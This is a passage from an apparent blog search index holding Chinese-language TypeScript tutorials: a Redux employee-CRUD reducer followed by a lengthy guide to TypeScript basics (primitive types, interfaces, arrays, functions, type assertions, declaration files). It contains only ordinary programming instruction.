&#x27;../../constants/urls&#x27;;import &#123;    GET_EMPLOYEE,    CREATE_EMPLOYEE,    DELETE_EMPLOYEE,    UPDATE_EMPLOYEE&#125; from &#x27;../../constants/actions&#x27;;import &#123;    EmployeeInfo,    EmployeeRequest,    EmployeeResponse,    CreateRequest,    DeleteRequest,    UpdateRequest&#125; from &#x27;../../interface/employee&#x27;;type State = Readonly&lt;&#123;    employeeList: EmployeeResponse&#125;&gt;type Action = &#123;    type: string;    payload: any;&#125;const initialState: State = &#123;    employeeList: undefined&#125;export function getEmployee(param: EmployeeRequest, callback: () =&gt; void) &#123;    return (dispatch: Dispatch) =&gt; &#123;        get(GET_EMPLOYEE_URL, param).then(res =&gt; &#123;            dispatch(&#123;                type: GET_EMPLOYEE,                payload: res.data            &#125;);            callback();        &#125;);    &#125;&#125;export function createEmployee(param: CreateRequest, callback: () =&gt; void) &#123;    return (dispatch: Dispatch) =&gt; &#123;        post(CREATE_EMPLOYEE_URL, param).then(res =&gt; &#123;            dispatch(&#123;                type: CREATE_EMPLOYEE,                payload: &#123;                    name: param.name,                    department: department[param.departmentId],                    departmentId: param.departmentId,                    hiredate: param.hiredate,                    level: level[param.levelId],                    levelId: param.levelId,                    ...res.data                &#125;            &#125;);            callback();        &#125;);    &#125;&#125;export function deleteEmployee(param: DeleteRequest) &#123;    return (dispatch: Dispatch) =&gt; &#123;        post(DELETE_EMPLOYEE_URL, param).then(res =&gt; &#123;            dispatch(&#123;                type: DELETE_EMPLOYEE,                payload: param.id            &#125;)        &#125;);    &#125;&#125;export function updateEmployee(param: UpdateRequest, callback: () =&gt; void) &#123;    return (dispatch: Dispatch) =&gt; &#123;        post(UPDATE_EMPLOYEE_URL, param).then(res =&gt; &#123;            dispatch(&#123;                type: UPDATE_EMPLOYEE,                payload: param            &#125;);            callback();        &#125;);    &#125;&#125;export default function(state = initialState, action: Action) &#123;    switch (action.type) &#123;        case GET_EMPLOYEE:            return &#123;                ...state,                employeeList: action.payload            &#125;        case CREATE_EMPLOYEE:            let newList = [action.payload, ...(state.employeeList as EmployeeInfo[])]            return &#123;                ...state,                employeeList: newList            &#125;        case DELETE_EMPLOYEE:            let reducedList = [...(state.employeeList as EmployeeInfo[])];            _.remove(reducedList, (item: EmployeeInfo) =&gt; &#123;                return item.id === action.payload            &#125;);            return &#123;                ...state,                employeeList: reducedList            &#125;        case UPDATE_EMPLOYEE:            let updatedList = [...(state.employeeList as EmployeeInfo[])];            let item: UpdateRequest = action.payload;            let index = _.findIndex(updatedList, &#123;                id: item.id            &#125;);            updatedList[index] = &#123;                id: item.id,                key: item.id,                name: item.name,                department: department[item.departmentId],                departmentId: item.departmentId,                hiredate: item.hiredate,                level: level[item.levelId],                levelId: item.levelId            &#125;            return &#123;                ...state,                employeeList: updatedList            &#125;        default:            return state    &#125;&#125;\n\n2.3 服务端使用Typescript\n项目地址 https://github.com/poetries/typescript-in-action/tree/master/ts-express\n\n三、Vue项目实践\n项目代码 https://github.com/poetries/typescript-in-action/tree/master/ts-vue\n\n\nTS不能识别.vue文件，需要声明文件\n\n// vue-shims.d.tsdeclare module &#x27;*.vue&#x27; &#123;    import Vue from &#x27;vue&#x27;    export default Vue  &#125;\n\n\n原文地址\n\n更多资料\nTypeScript 从零实现 axios\nTypescript基础及结合React实践(一)\nTypescript总结篇（二）\nTypescript+React模板搭建（三）\n\n","categories":["前端"],"tags":["typescript"]},{"title":"Typescript总结","url":"/2021/08/23/html+css+js+ts/5-Typescript%E6%80%BB%E7%BB%93/","content":"一、简介1.1 什么是 TypeScript\nTypeScript 是 JavaScript 的一个超集，主要提供了类型系统和对 ES6的支持\nTypeScript 是由微软开发的一款开源的编程语言\nTypeScript 是 Javascript 的超级，遵循最新的 ES6、Es5 规范。TypeScript 扩展了 JavaScript 的语法\nTypeScript 更像后端 java、C#这样的面向对象语言可以让 js 开发大型企业项目\n\n1.2 为什么选择 TypeScript\nTypescript和es6、es5关系\n\n\nTypeScript 增加了代码的可读性和可维护性\n\n类型系统实际上是最好的文档，大部分的函数看看类型的定义就可以知道如何使用了\n可以在编译阶段就发现大部分错误，这总比在运行时候出错好\n增强了编辑器和 IDE 的功能，包括代码补全、接口提示、跳转到定义、重构等\n\nTypeScript 非常包容\n\nTypeScript 是 JavaScript 的超集，.js 文件可以直接重命名为 .ts 即可\n即使不显式的定义类型，也能够自动做出类型推论\n可以定义从简单到复杂的几乎一切类型\n即使 TypeScript 编译报错，也可以生成 JavaScript 文件\n兼容第三方库，即使第三方库不是用 TypeScript 写的，也可以编写单独的类型文件供 TypeScript 读取\n\nTypeScript 拥有活跃的社区\n\n大部分第三方库都有提供给 TypeScript 的类型定义文件\nGoogle 开发的Angular2 就是使用 TypeScript 编写的\nTypeScript 拥抱了 ES6 规范，也支持部分 ESNext 草案的规范\n最新的 Vue 、React 也可以集成 TypeScript\n\nTypeScript 的缺点\n\n有一定的学习成本，需要理解接口（Interfaces）、泛型（Generics）、类（Classes）、枚举类型（Enums）等前端工程师可能不是很熟悉的概念\n短期可能会增加一些开发成本，毕竟要多写一些类型的定义，不过对于一个需要长期维护的项目，TypeScript 能够减少其维护成本\n集成到构建流程需要一些工作量\n可能和一些库结合的不是很完美\n\n1.3 安装 TypeScripttypescript 安装\nnpm i typescript -g\n\n\n全局安装完成后，我们新建一个hello.ts的ts文件\n\n// hello.ts内容let a = &quot;poet&quot;\n\n\n接下来我们在命令行输入tsc hello.ts来编译这个ts文件，然后会在同级目录生成一个编译好了的hello.js文件\n\n// hello.js内容var = &quot;poet&quot;\n\n\n那么我们每次都要输tsc hello.ts命令来编译，这样很麻烦，能否让它自动编译？答案是可以的，使用vscode来开发，需要配置一下vscode就可以。\n\n\n首先我们在命令行执行tsc --init来生成配置文件，然后我们在目录下看到生成了一个tsconfig.json文件\n\n\n\n这个json文件里有很多选项\n\n\ntarget是选择编译到什么语法\nmodule则是模块类型\noutDir则是输出目录，可以指定这个参数到指定目录\n\n\n更多细节 https://zhongsp.gitbooks.io/typescript-handbook/content/doc/handbook/tsconfig.json.html\n\n\n接下来我们需要开启监控了，在vscode任务栏中\n\n\n1.4 Hello TypeScript\n将以下代码复制到 hello.ts 中\n\nfunction sayHello(person: string) &#123;    return &#x27;Hello, &#x27; + person;&#125;let user = &#x27;poetries&#x27;;console.log(sayHello(user));tsc hello.ts//这时候会生成一个编译好的文件 hello.js：function sayHello(person) &#123;    return &#x27;Hello, &#x27; + person;&#125;var user = &#x27;poetries&#x27;;console.log(sayHello(user));\n\n\nTypeScript 中，使用 : 指定变量的类型，: 的前后有没有空格都可以\n\n\nTypeScript 只会进行静态检查，如果发现有错误，编译的时候就会报错\nTypeScript 编译的时候即使报错了，还是会生成编译结果，我们仍然可以使用这个编译之后的文件\n\n二、基础2.1 原始数据类型\nJavaScript 的类型分为两种：原始数据类型（Primitive data types）和对象类型（Object types）。\n\n\n原始数据类型包括：布尔值、数值、字符串、null、undefined 以及 ES6中的新类型 Symbol。\n\n\n本节主要介绍前五种原始数据类型在 TypeScript 中的应用\n\n2.1.1 布尔值\n布尔值是最基础的数据类型，在 TypeScript 中，使用 boolean 定义布尔值类型\n\nlet isDone: boolean = false;// 编译通过// 后面约定，未强调编译错误的代码片段，默认为编译通过\n\n\n注意，使用构造函数 Boolean 创造的对象不是布尔值\n\nlet createdByNewBoolean: boolean = new Boolean(1);// index.ts(1,5): error TS2322: Type &#x27;Boolean&#x27; is not assignable to type &#x27;boolean&#x27;.// 后面约定，注释中标出了编译报错的代码片段，表示编译未通过\n\n\n事实上 new Boolean() 返回的是一个 Boolean 对象：\n\nlet createdByNewBoolean: Boolean = new Boolean(1);\n\n\n直接调用 Boolean 也可以返回一个 boolean 类型：\n\nlet createdByBoolean: boolean = Boolean(1);\n\n\n在 TypeScript 中，boolean是 JavaScript 中的基本类型，而 Boolean 是 JavaScript中的构造函数。其他基本类型（除了 null 和 undefined）一样\n\n2.1.2 数值\n使用 number 定义数值类型\n\nlet decLiteral: number = 6;let hexLiteral: number = 0xf00d;// ES6 中的二进制表示法let binaryLiteral: number = 0b1010;// ES6 中的八进制表示法let octalLiteral: number = 0o744;let notANumber: number = NaN;let infinityNumber: number = Infinity;//编译结果：var decLiteral = 6;var hexLiteral = 0xf00d;// ES6 中的二进制表示法var binaryLiteral = 10;// ES6 中的八进制表示法var octalLiteral = 484;var notANumber = NaN;var infinityNumber = Infinity;\n\n\n其中 0b1010 和 0o744是 ES6 中的二进制和八进制表示法，它们会被编译为十进制数字\n\n2.1.3 字符串\n使用 string 定义字符串类型：\n\nlet myName: string = &#x27;Tom&#x27;;let myAge: number = 25;// 模板字符串let sentence: string = `Hello, my name is $&#123;myName&#125;.I&#x27;ll be $&#123;myAge + 1&#125; years old next month.`;\n\n2.1.4 空值\nJavaScript 没有空值（Void）的概念，在 TypeScript 中，可以用 void 表示没有任何返回值的函数\n\nfunction alertName(): void &#123;    alert(&#x27;My name is Tom&#x27;);&#125;\n\n\n声明一个 void 类型的变量没有什么用，因为你只能将它赋值为 undefined和 null：\n\nlet unusable: void = undefined;\n\n2.1.5 Null 和 Undefined\n在 TypeScript 中，可以使用 null 和 undefined来定义这两个原始数据类型：\n\nlet u: undefined = undefined;let n: null = null;\n\n\nundefined` 类型的变量只能被赋值为 `undefined`，`null` 类型的变量只能被赋值为 `null\n\n\n与 void 的区别是，undefined和 null 是所有类型的子类型。也就是说 undefined 类型的变量，可以赋值给 number 类型的变量\n\n// 这样不会报错let num: number = undefined;// 这样也不会报错let u: undefined;let num: number = u;\n\n\n而 void 类型的变量不能赋值给 number 类型的变量：\n\nlet u: void;let num: number = u;// index.ts(2,5): error TS2322: Type &#x27;void&#x27; is not assignable to type &#x27;number&#x27;.\n\n2.2 任意值Any\n如果是一个普通类型，在赋值过程中改变类型是不被允许的\n\nlet myFavoriteNumber: string = &#x27;seven&#x27;;myFavoriteNumber = 7;// index.ts(2,1): error TS2322: Type &#x27;number&#x27; is not assignable to type &#x27;string&#x27;.\n\n\n但如果是 any 类型，则允许被赋值为任意类型。\n\nlet myFavoriteNumber: any = &#x27;seven&#x27;;myFavoriteNumber = 7;\n\n任意值的属性和方法\n在任意值上访问任何属性都是允许的：\nlet anyThing: any = &#x27;hello&#x27;;console.log(anyThing.myName);console.log(anyThing.myName.firstName);\n\n也允许调用任何方法：\nlet anyThing: any = &#x27;Tom&#x27;;anyThing.setName(&#x27;Jerry&#x27;);anyThing.setName(&#x27;Jerry&#x27;).sayHello();anyThing.myName.setFirstName(&#x27;Cat&#x27;);\n\n\n可以认为，声明一个变量为任意值之后，对它的任何操作，返回的内容的类型都是任意值\n\n未声明类型的变量\n\n变量如果在声明的时候，未指定其类型，那么它会被识别为任意值类型：\n\nlet something;something = &#x27;seven&#x27;;something = 7;something.setName(&#x27;Tom&#x27;);\n\n等价于\nlet something: any;something = &#x27;seven&#x27;;something = 7;something.setName(&#x27;Tom&#x27;);\n\n2.3 类型推论\n如果没有明确的指定类型，那么 TypeScript 会依照类型推论（Type Inference）的规则推断出一个类型\n\n什么是类型推论\n以下代码虽然没有指定类型，但是会在编译的时候报错：\nlet myFavoriteNumber = &#x27;seven&#x27;;myFavoriteNumber = 7;// index.ts(2,1): error TS2322: Type &#x27;number&#x27; is not assignable to type &#x27;string&#x27;.\n\n事实上，它等价于：\nlet myFavoriteNumber: string = &#x27;seven&#x27;;myFavoriteNumber = 7;// index.ts(2,1): error TS2322: Type &#x27;number&#x27; is not assignable to type &#x27;string&#x27;.\n\nTypeScript 会在没有明确的指定类型的时候推测出一个类型，这就是类型推论\n如果定义的时候没有赋值，不管之后有没有赋值，都会被推断成 any 类型而完全不被类型检查\nlet myFavoriteNumber;myFavoriteNumber = &#x27;seven&#x27;;myFavoriteNumber = 7;\n\n2.4 联合类型\n联合类型（Union Types）表示取值可以为多种类型中的一种\n\n// 简单例子let myFavoriteNumber: string | number;myFavoriteNumber = &#x27;seven&#x27;;myFavoriteNumber = 7;let myFavoriteNumber: string | number;myFavoriteNumber = true;// index.ts(2,1): error TS2322: Type &#x27;boolean&#x27; is not assignable to type &#x27;string | number&#x27;.//   Type &#x27;boolean&#x27; is not assignable to type &#x27;number&#x27;.\n\n\n联合类型使用 | 分隔每个类型。\n这里的 let myFavoriteNumber: string | number 的含义是，允许 myFavoriteNumber 的类型是 string 或者 number，但是不能是其他类型\n\n访问联合类型的属性或方法\n\n当 TypeScript 不确定一个联合类型的变量到底是哪个类型的时候，我们只能访问此联合类型的所有类型里共有的属性或方法\n\nfunction getLength(something: string | number): number &#123;    return something.length;&#125;// length 不是 string 和 number 的共有属性，所以会报错// index.ts(2,22): error TS2339: Property &#x27;length&#x27; does not exist on type &#x27;string | number&#x27;.//   Property &#x27;length&#x27; does not exist on type &#x27;number&#x27;.\n\n\n访问 string 和 number 的共有属性是没问题的\n\nfunction getString(something: string | number): string &#123;    return something.toString();&#125;\n\n\n联合类型的变量在被赋值的时候，会根据类型推论的规则推断出一个类型\n\nlet myFavoriteNumber: string | number;myFavoriteNumber = &#x27;seven&#x27;;console.log(myFavoriteNumber.length); // 5myFavoriteNumber = 7;console.log(myFavoriteNumber.length); // 编译时报错// index.ts(5,30): error TS2339: Property &#x27;length&#x27; does not exist on type &#x27;number&#x27;.\n\n\n上例中，第二行的 myFavoriteNumber 被推断成了 string，访问它的 length 属性不会报错。\n而第四行的 myFavoriteNumber 被推断成了 number，访问它的 length 属性时就报错了\n\n2.5 对象的类型——接口2.5.1 简单例子\n在 TypeScript 中，我们使用接口（Interfaces）来定义对象的类型\n\n什么是接口\n\n在面向对象语言中，接口（Interfaces）是一个很重要的概念，它是对行为的抽象，而具体如何行动需要由类（classes）去实现（implements）。\nTypeScript 中的接口是一个非常灵活的概念，除了可用于对类的一部分行为进行抽象以外，也常用于对「对象的形状（Shape）」进行描述。\n\n接口一般首字母大写\ninterface Person &#123;    name: string;    age: number;&#125;let tom: Person = &#123;    name: &#x27;Tom&#x27;,    age: 25&#125;;\n\n\n上面的例子中，我们定义了一个接口 Person，接着定义了一个变量 tom，它的类型是 Person。这样，我们就约束了 tom 的形状必须和接口 Person 一致\n\n定义的变量比接口少了一些属性是不允许的\ninterface Person &#123;    name: string;    age: number;&#125;let tom: Person = &#123;    name: &#x27;Tom&#x27;&#125;;// index.ts(6,5): error TS2322: Type &#x27;&#123; name: string; &#125;&#x27; is not assignable to type &#x27;Person&#x27;.//   Property &#x27;age&#x27; is missing in type &#x27;&#123; name: string; &#125;&#x27;.\n\n多一些属性也是不允许的\ninterface Person &#123;    name: string;    age: number;&#125;let tom: Person = &#123;    name: &#x27;Tom&#x27;,    age: 25,    gender: &#x27;male&#x27;&#125;;// index.ts(9,5): error TS2322: Type &#x27;&#123; name: string; age: number; gender: string; &#125;&#x27; is not assignable to type &#x27;Person&#x27;.//   Object literal may only specify known properties, and &#x27;gender&#x27; does not exist in type &#x27;Person&#x27;.\n\n\n可见，赋值的时候，变量的形状必须和接口的形状保持一致。\n\n2.5.2 可选属性\n有时我们希望不要完全匹配一个形状，那么可以用可选属性\n\n可选属性的含义是该属性可以不存在\ninterface Person &#123;    name: string;    age?: number;&#125;let tom: Person = &#123;    name: &#x27;Tom&#x27;&#125;;interface Person &#123;    name: string;    age?: number;&#125;let tom: Person = &#123;    name: &#x27;Tom&#x27;,    age: 25&#125;;\n\n2.5.3 任意属性\n有时候我们希望一个接口允许有任意的属性，可以使用如下方式\n\ninterface Person &#123;    name: string;    age?: number;    [propName: string]: any;&#125;let tom: Person = &#123;    name: &#x27;Tom&#x27;,    gender: &#x27;male&#x27;&#125;;\n\n\n使用 [propName: string] 定义了任意属性取 string 类型的值\n需要注意的是，一旦定义了任意属性，那么确定属性和可选属性都必须是它的子属性\n\ninterface Person &#123;    name: string;    age?: number;    [propName: string]: string;&#125;let tom: Person = &#123;    name: &#x27;Tom&#x27;,    age: 25,    gender: &#x27;male&#x27;&#125;;// index.ts(3,5): error TS2411: Property &#x27;age&#x27; of type &#x27;number&#x27; is not assignable to string index type &#x27;string&#x27;.// index.ts(7,5): error TS2322: Type &#x27;&#123; [x: string]: string | number; name: string; age: number; gender: string; &#125;&#x27; is not assignable to type &#x27;Person&#x27;.//   Index signatures are incompatible.//     Type &#x27;string | number&#x27; is not assignable to type &#x27;string&#x27;.//       Type &#x27;number&#x27; is not assignable to type &#x27;string&#x27;.\n\n\n上例中，任意属性的值允许是 string，但是可选属性 age 的值却是 number，number不是 string 的子属性，所以报错了。\n另外，在报错信息中可以看出，此时 &#123; name: &#39;Tom&#39;, age: 25, gender: &#39;male&#39; &#125;的类型被推断成了 &#123; [x: string]: string | number; name: string; age: number; gender: string; &#125;，这是联合类型和接口的结合\n\n2.5.4 只读属性\n有时候我们希望对象中的一些字段只能在创建的时候被赋值，那么可以用 readonly定义只读属性\n\ninterface Person &#123;    readonly id: number;    name: string;    age?: number;    [propName: string]: any;&#125;let tom: Person = &#123;    id: 89757,    name: &#x27;Tom&#x27;,    gender: &#x27;male&#x27;&#125;;tom.id = 9527;// index.ts(14,5): error TS2540: Cannot assign to &#x27;id&#x27; because it is a constant or a read-only property.\n\n\n上例中，使用 readonly 定义的属性 id 初始化后，又被赋值了，所以报错了\n\n注意，只读的约束存在于第一次给对象赋值的时候，而不是第一次给只读属性赋值的时候\ninterface Person &#123;    readonly id: number;    name: string;    age?: number;    [propName: string]: any;&#125;let tom: Person = &#123;    name: &#x27;Tom&#x27;,    gender: &#x27;male&#x27;&#125;;tom.id = 89757;// index.ts(8,5): error TS2322: Type &#x27;&#123; name: string; gender: string; &#125;&#x27; is not assignable to type &#x27;Person&#x27;.//   Property &#x27;id&#x27; is missing in type &#x27;&#123; name: string; gender: string; &#125;&#x27;.// index.ts(13,5): error TS2540: Cannot assign to &#x27;id&#x27; because it is a constant or a read-only property.\n\n\n上例中，报错信息有两处，第一处是在对 tom 进行赋值的时候，没有给 id 赋值。\n第二处是在给 tom.id 赋值的时候，由于它是只读属性，所以报错了\n\n2.6 数组的类型\n在 TypeScript 中，数组类型有多种定义方式，比较灵活。\n\n2.6.1「类型 + 方括号」表示法\n最简单的方法是使用「类型 + 方括号」来表示数组：\n\nlet fibonacci: number[] = [1, 1, 2, 3, 5];\n\n\n数组的项中不允许出现其他的类型\n\nlet fibonacci: number[] = [1, &#x27;1&#x27;, 2, 3, 5];// index.ts(1,5): error TS2322: Type &#x27;(number | string)[]&#x27; is not assignable to type &#x27;number[]&#x27;.//   Type &#x27;number | string&#x27; is not assignable to type &#x27;number&#x27;.//     Type &#x27;string&#x27; is not assignable to type &#x27;number&#x27;.\n\n\n上例中，[1, &#39;1&#39;, 2, 3, 5] 的类型被推断为 (number | string)[]，这是联合类型和数组的结合。\n数组的一些方法的参数也会根据数组在定义时约定的类型进行限制\n\nlet fibonacci: number[] = [1, 1, 2, 3, 5];fibonacci.push(&#x27;8&#x27;);// index.ts(2,16): error TS2345: Argument of type &#x27;string&#x27; is not assignable to parameter of type &#x27;number&#x27;.\n\n\n上例中，push 方法只允许传入 number 类型的参数，但是却传了一个 string 类型的参数，所以报错了\n\n2.6.2 数组泛型\n也可以使用数组泛型（Array Generic）Array来表示数组\n\nlet fibonacci: Array&lt;number&gt; = [1, 1, 2, 3, 5];\n\n2.6.3 用接口表示数组interface NumberArray &#123;    [index: number]: number;&#125;let fibonacci: NumberArray = [1, 1, 2, 3, 5];\n\n\nNumberArray` 表示：只要 `index` 的类型是 `number`，那么值的类型必须是 `number\n\n2.6.4 any 在数组中的应用\n一个比较常见的做法是，用 any 表示数组中允许出现任意类型：\n\nlet list: any[] = [&#x27;poetries&#x27;, 22, &#123; website: &#x27;http://blog.poetries.top&#x27; &#125;];\n\n2.6.5 类数组\n类数组（Array-like Object）不是数组类型，比如 arguments\n\nfunction sum() &#123;    let args: number[] = arguments;&#125;// index.ts(2,7): error TS2322: Type &#x27;IArguments&#x27; is not assignable to type &#x27;number[]&#x27;.//   Property &#x27;push&#x27; is missing in type &#x27;IArguments&#x27;.\n\n\n事实上常见的类数组都有自己的接口定义，如 IArguments, NodeList, HTMLCollection 等：\n\nfunction sum() &#123;    let args: IArguments = arguments;&#125;\n\n2.7 函数的类型2.7.1 函数声明\n在 JavaScript 中，有两种常见的定义函数的方式——函数声明（Function Declaration）和函数表达式（Function Expression）\n\n// 函数声明（Function Declaration）function sum(x, y) &#123;    return x + y;&#125;// 函数表达式（Function Expression）let mySum = function (x, y) &#123;    return x + y;&#125;;\n\n\n一个函数有输入和输出，要在 TypeScript 中对其进行约束，需要把输入和输出都考虑到，其中函数声明的类型定义较简单\n\nfunction sum(x: number, y: number): number &#123;    return x + y;&#125;\n\n注意，输入多余的（或者少于要求的）参数，是不被允许的：\nfunction sum(x: number, y: number): number &#123;    return x + y;&#125;sum(1, 2, 3);// index.ts(4,1): error TS2346: Supplied parameters do not match any signature of call target.function sum(x: number, y: number): number &#123;    return x + y;&#125;sum(1);// index.ts(4,1): error TS2346: Supplied parameters do not match any signature of call target.\n\n2.7.2 函数表达式\n如果要我们现在写一个对函数表达式（Function Expression）的定义，可能会写成这样\n\nlet mySum = function (x: number, y: number): number &#123;    return x + y;&#125;;\n\n\n这是可以通过编译的，不过事实上，上面的代码只对等号右侧的匿名函数进行了类型定义，而等号左边的 mySum，是通过赋值操作进行类型推论而推断出来的。如果需要我们手动给 mySum 添加类型，则应该是这样\n\n// =&gt;左边 (x: number, y: number) 是输入类型 // =&gt;右边number是输出类型let mySum: (x: number, y: number) =&gt; number = function (x: number, y: number): number &#123;    return x + y;&#125;;\n\n注意不要混淆了 TypeScript 中的 &#x3D;&gt; 和 ES6 中的 &#x3D;&gt;\n\n在 TypeScript 的类型定义中，=&gt; 用来表示函数的定义，左边是输入类型，需要用括号括起来，右边是输出类型。\n\n2.7.3 用接口定义函数的形状\n我们也可以使用接口的方式来定义一个函数需要符合的形状\n\ninterface SearchFunc &#123;    (source: string, subString: string): boolean;&#125;let mySearch: SearchFunc;mySearch = function(source: string, subString: string) &#123;    return source.search(subString) !== -1;&#125;\n\n需要注意的是，可选参数必须接在必需参数后面。换句话说，可选参数后面不允许再出现必须参数了\nfunction buildName(firstName?: string, lastName: string) &#123;    if (firstName) &#123;        return firstName + &#x27; &#x27; + lastName;    &#125; else &#123;        return lastName;    &#125;&#125;let tomcat = buildName(&#x27;Tom&#x27;, &#x27;Cat&#x27;);let tom = buildName(undefined, &#x27;Tom&#x27;);// index.ts(1,40): error TS1016: A required parameter cannot follow an optional parameter.\n\n2.7.4 参数默认值\n在 ES6中，我们允许给函数的参数添加默认值，TypeScript 会将添加了默认值的参数识别为可选参数\n\nfunction buildName(firstName: string, lastName: string = &#x27;Cat&#x27;) &#123;    return firstName + &#x27; &#x27; + lastName;&#125;let tomcat = buildName(&#x27;Tom&#x27;, &#x27;Cat&#x27;);let tom = buildName(&#x27;Tom&#x27;);\n\n此时就不受「可选参数必须接在必需参数后面」的限制了\nfunction buildName(firstName: string = &#x27;Tom&#x27;, lastName: string) &#123;    return firstName + &#x27; &#x27; + lastName;&#125;let tomcat = buildName(&#x27;Tom&#x27;, &#x27;Cat&#x27;);let cat = buildName(undefined, &#x27;Cat&#x27;);\n\n2.7.5 剩余参数\nES6 中，可以使用 ...rest 的方式获取函数中的剩余参数（rest 参数）\n\nfunction push(array, ...items) &#123;    items.forEach(function(item) &#123;        array.push(item);    &#125;);&#125;let a = [];push(a, 1, 2, 3);\n\n\n事实上，items 是一个数组。所以我们可以用数组的类型来定义它\n\nfunction push(array: any[], ...items: any[]) &#123;    items.forEach(function(item) &#123;        array.push(item);    &#125;);&#125;let a = [];push(a, 1, 2, 3);\n\n\n注意，rest 参数只能是最后一个参数\n\n2.7.6 函数重载\n重载允许一个函数接受不同数量或类型的参数时，作出不同的处理。\n\n\n比如，我们需要实现一个函数 reverse，输入数字 123 的时候，输出反转的数字 321，输入字符串 &#39;hello&#39; 的时候，输出反转的字符串 &#39;olleh&#39;\n\n利用联合类型，我们可以这么实现\nfunction reverse(x: number | string): number | string &#123;    if (typeof x === &#x27;number&#x27;) &#123;        return Number(x.toString().split(&#x27;&#x27;).reverse().join(&#x27;&#x27;));    &#125; else if (typeof x === &#x27;string&#x27;) &#123;        return x.split(&#x27;&#x27;).reverse().join(&#x27;&#x27;);    &#125;&#125;\n\n\n然而这样有一个缺点，就是不能够精确的表达，输入为数字的时候，输出也应该为数字，输入为字符串的时候，输出也应该为字符串\n\n这时，我们可以使用重载定义多个 reverse 的函数类型\nfunction reverse(x: number): number;function reverse(x: string): string;function reverse(x: number | string): number | string &#123;    if (typeof x === &#x27;number&#x27;) &#123;        return Number(x.toString().split(&#x27;&#x27;).reverse().join(&#x27;&#x27;));    &#125; else if (typeof x === &#x27;string&#x27;) &#123;        return x.split(&#x27;&#x27;).reverse().join(&#x27;&#x27;);    &#125;&#125;\n\n\n上例中，我们重复定义了多次函数 reverse，前几次都是函数定义，最后一次是函数实现。在编辑器的代码提示中，可以正确的看到前两个提示。\n\n\n注意，TypeScript 会优先从最前面的函数定义开始匹配，所以多个函数定义如果有包含关系，需要优先把精确的定义写在前面\n\n2.8 类型断言\n类型断言（Type Assertion）可以用来手动指定一个值的类型。\n\n语法\n&lt;类型&gt;值// 或值 as 类型\n\n\n在 tsx 语法（React 的 jsx 语法的 ts 版）中必须用后一种\n\n例子：将一个联合类型的变量指定为一个更加具体的类型\n\n当 TypeScript 不确定一个联合类型的变量到底是哪个类型的时候，我们只能访问此联合类型的所有类型里共有的属性或方法\n\nfunction getLength(something: string | number): number &#123;    return something.length;&#125;// index.ts(2,22): error TS2339: Property &#x27;length&#x27; does not exist on type &#x27;string | number&#x27;.//   Property &#x27;length&#x27; does not exist on type &#x27;number&#x27;.\n\n\n而有时候，我们确实需要在还不确定类型的时候就访问其中一个类型的属性或方法，比如\n\nfunction getLength(something: string | number): number &#123;    if (something.length) &#123;        return something.length;    &#125; else &#123;        return something.toString().length;    &#125;&#125;// index.ts(2,19): error TS2339: Property &#x27;length&#x27; does not exist on type &#x27;string | number&#x27;.//   Property &#x27;length&#x27; does not exist on type &#x27;number&#x27;.// index.ts(3,26): error TS2339: Property &#x27;length&#x27; does not exist on type &#x27;string | number&#x27;.//   Property &#x27;length&#x27; does not exist on type &#x27;number&#x27;.\n\n\n上例中，获取 something.length的时候会报错\n\n此时可以使用类型断言，将 something 断言成 string\nfunction getLength(something: string | number): number &#123;    if ((&lt;string&gt;something).length) &#123;        return (&lt;string&gt;something).length;    &#125; else &#123;        return something.toString().length;    &#125;&#125;\n\n\n类型断言的用法如上，在需要断言的变量前加上 &#96;&#96; 即可\n\n类型断言不是类型转换，断言成一个联合类型中不存在的类型是不允许的\nfunction toBoolean(something: string | number): boolean &#123;    return &lt;boolean&gt;something;&#125;// index.ts(2,10): error TS2352: Type &#x27;string | number&#x27; cannot be converted to type &#x27;boolean&#x27;.//   Type &#x27;number&#x27; is not comparable to type &#x27;boolean&#x27;.\n\n2.9 声明文件\n当使用第三方库时，我们需要引用它的声明文件\n\n2.9.1 声明(declare)语句\n假如我们想使用第三方库，比如 jQuery，我们通常这样获取一个 id 是 foo 的元素\n\n$(&#x27;#foo&#x27;);// orjQuery(&#x27;#foo&#x27;);\n\n\n但是在 TypeScript 中，我们并不知道 $ 或 jQuery是什么东西\n\njQuery(&#x27;#foo&#x27;);// index.ts(1,1): error TS2304: Cannot find name &#x27;jQuery&#x27;.\n\n\n这时，我们需要使用 declare 关键字来定义它的类型，帮助TypeScript 判断我们传入的参数类型对不对\n\ndeclare var jQuery: (selector: string) =&gt; any;jQuery(&#x27;#foo&#x27;);\n\n\ndeclare 定义的类型只会用于编译时的检查，编译结果中会被删除\n\n//上例的编译结果是：jQuery(&#x27;#foo&#x27;);\n\n2.9.2 声明文件(约定.d.ts后缀)\n通常我们会把类型声明放到一个单独的文件中，这就是声明文件\n\n// jQuery.d.tsdeclare var jQuery: (string) =&gt; any;\n\n\n我们约定声明文件以 .d.ts 为后缀。\n然后在使用到的文件的开头，用「三斜线指令」///表示引用了声明文件\n\n/// &lt;reference path=&quot;./jQuery.d.ts&quot; /&gt;jQuery(&#x27;#foo&#x27;);\n\n2.9.3 第三方声明文件\n当然，jQuery 的声明文件不需要我们定义了，已经有人帮我们定义好了：jQuery in DefinitelyTyped\n\n// https://github.com/DefinitelyTyped/DefinitelyTyped/blob/master/types/jquery/index.d.ts// Type definitions for jquery 3.3// Project: https://jquery.com// Definitions by: Leonard Thieu &lt;https://github.com/leonard-thieu&gt;//                 Boris Yankov &lt;https://github.com/borisyankov&gt;//                 Christian Hoffmeister &lt;https://github.com/choffmeister&gt;//                 Steve Fenton &lt;https://github.com/Steve-Fenton&gt;//                 Diullei Gomes &lt;https://github.com/Diullei&gt;//                 Tass Iliopoulos &lt;https://github.com/tasoili&gt;//                 Jason Swearingen &lt;https://github.com/jasons-novaleaf&gt;//                 Sean Hill &lt;https://github.com/seanski&gt;//                 Guus Goossens &lt;https://github.com/Guuz&gt;//                 Kelly Summerlin &lt;https://github.com/ksummerlin&gt;//                 Basarat Ali Syed &lt;https://github.com/basarat&gt;//                 Nicholas Wolverson &lt;https://github.com/nwolverson&gt;//                 Derek Cicerone &lt;https://github.com/derekcicerone&gt;//                 Andrew Gaspar &lt;https://github.com/AndrewGaspar&gt;//                 Seikichi Kondo &lt;https://github.com/seikichi&gt;//                 Benjamin Jackman &lt;https://github.com/benjaminjackman&gt;//                 Poul Sorensen &lt;https://github.com/s093294&gt;//                 Josh Strobl &lt;https://github.com/JoshStrobl&gt;//                 John Reilly &lt;https://github.com/johnnyreilly&gt;//                 Dick van den Brink &lt;https://github.com/DickvdBrink&gt;//                 Thomas Schulz &lt;https://github.com/King2500&gt;//                 Terry Mun 